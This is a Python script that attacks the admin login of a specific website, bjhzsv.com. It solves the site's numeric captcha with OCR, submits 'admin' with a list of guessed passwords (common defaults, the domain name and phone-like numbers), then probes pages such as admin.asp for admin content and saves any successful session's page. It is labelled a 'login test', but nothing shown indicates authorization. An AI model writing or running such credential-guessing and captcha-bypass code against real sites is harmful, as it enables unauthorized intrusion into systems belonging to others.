import pytesseract
from PIL import Image
import requests
import re
import io

def download_captcha(session):
    """Download captcha, enlarge, OCR, return text."""
    url = "http://bjhzsv.com/main/inc/code.asp"
    r = session.get(url, headers={"User-Agent": "Mozilla/5.0"})
    if r.status_code != 200:
        return None
    
    img = Image.open(io.BytesIO(r.content))
    w, h = img.size
    big = img.resize((w * 10, h * 10), Image.NEAREST)
    
    # Try various OCR configs
    configs = [
        '--psm 8 --oem 3 -c tessedit_char_whitelist=0123456789',
        '--psm 7 --oem 3 -c tessedit_char_whitelist=0123456789',
        '--psm 13 --oem 3 -c tessedit_char_whitelist=0123456789',
    ]
    
    best = None
    for cfg in configs:
        t = pytesseract.image_to_string(big, config=cfg).strip()
        cleaned = re.sub(r'[^0-9]', '', t)
        if len(cleaned) == 4:
            return cleaned  # Exact match!
        if len(cleaned) >= 3 and len(cleaned) <= 5:
            best = cleaned
    
    # Try binarized
    gray = big.convert('L')
    bw = gray.point(lambda x: 0 if x < 200 else 255)
    t = pytesseract.image_to_string(bw, config='--psm 8 --oem 3 -c tessedit_char_whitelist=0123456789').strip()
    cleaned = re.sub(r'[^0-9]', '', t)
    if len(cleaned) == 4:
        return cleaned
    if len(cleaned) >= 3 and not best:
        best = cleaned
    
    return best[:4] if best else None

def try_login(username, password):
    """Try a login, follow redirects, check if we reach admin area."""
    session = requests.Session()
    
    # Step 1: GET main page
    r = session.get("http://bjhzsv.com/main/", headers={"User-Agent": "Mozilla/5.0"}, timeout=15)
    
    # Step 2: Download captcha
    captcha = download_captcha(session)
    if not captcha:
        return False, "NO_CAPTCHA", session, None
    
    # Step 3: POST login
    login_data = {"t1": username, "t2": password, "t3": captcha}
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Content-Type": "application/x-www-form-urlencoded",
        "Referer": "http://bjhzsv.com/main/"
    }
    
    r = session.post("http://bjhzsv.com/main/a7chkuser.asp", data=login_data, headers=headers, timeout=15)
    print(f"  Login response ({len(r.text)} bytes): {r.text[:300]}")
    
    # Follow redirect if present
    # Check if it's a JavaScript redirect
    redirect_match = re.search(r"href='([^']+)'", r.text)
    if redirect_match:
        target = redirect_match.group(1)
        print(f"  JS redirect to: {target}")
        
        # Follow to index.asp
        if not target.startswith("http"):
            target = "http://bjhzsv.com/main/" + target
        r2 = session.get(target, headers={"User-Agent": "Mozilla/5.0"}, timeout=15)
        print(f"  After redirect: HTTP {r2.status_code}, {len(r2.text)} bytes")
        print(f"  First 500 chars: {r2.text[:500]}")
        
        # Check what index.asp returns
        # Also check if there's a frameset or admin content
        if "admin" in r2.text.lower() or "管理" in r2.text:
            print(f"  *** FOUND ADMIN CONTENT AFTER REDIRECT! ***")
            return True, captcha, session, r2.text
        
        # Try fetching other common admin pages
        for page in ["index.asp", "admin.asp", "main.asp", "left.asp", "top.asp", "right.asp"]:
            if not page.startswith("http"):
                page_url = "http://bjhzsv.com/main/" + page
            r3 = session.get(page_url, headers={"User-Agent": "Mozilla/5.0"}, timeout=15)
            if "管理" in r3.text or "admin" in r3.text.lower():
                print(f"  Found admin content in {page}!")
                return True, captcha, session, r3.text
    
    return False, captcha, session, r.text

passwords = [
    "admin",
    "admin999",
    "admin888", 
    "123456",
    "bjhzsv",
    "bjhzsv.com",
    "13681449049",
    "01062489782"
]

username = "admin"

print("=" * 60)
print("BJZHSV.COM ENHANCED LOGIN TEST")
print("=" * 60)

# First, let's just see what the main page looks like
s = requests.Session()
r = s.get("http://bjhzsv.com/main/", headers={"User-Agent": "Mozilla/5.0"}, timeout=15)
print(f"\nMain page content:\n{r.text}")
print(f"\nCookies: {dict(s.cookies)}")

# Also try fetching index.asp directly
r2 = s.get("http://bjhzsv.com/main/index.asp", headers={"User-Agent": "Mozilla/5.0"}, timeout=15)
print(f"\nindex.asp content:\n{r2.text[:500]}")

# Also look for login page alternative
r3 = s.get("http://bjhzsv.com/main/login.asp", headers={"User-Agent": "Mozilla/5.0"}, timeout=15)
if r3.status_code == 200:
    print(f"\nlogin.asp content:\n{r3.text[:500]}")

for pwd in passwords:
    print(f"\n{'='*60}")
    print(f"TRYING: {username}:{pwd}")
    print(f"{'='*60}")
    
    success, captcha, session, response_text = try_login(username, pwd)
    
    if success:
        print(f"\n  *** SUCCESS! Password: {pwd} (captcha: {captcha}) ***")
        with open(f"/tmp/bjhzsv_success_{pwd}.html", "w") as f:
            f.write(response_text)
        print(f"  Saved response to /tmp/bjhzsv_success_{pwd}.html")
        break
    else:
        print(f"  -> Failed (captcha: {captcha})")

print("\n" + "=" * 60)
print("DONE")
print("=" * 60)
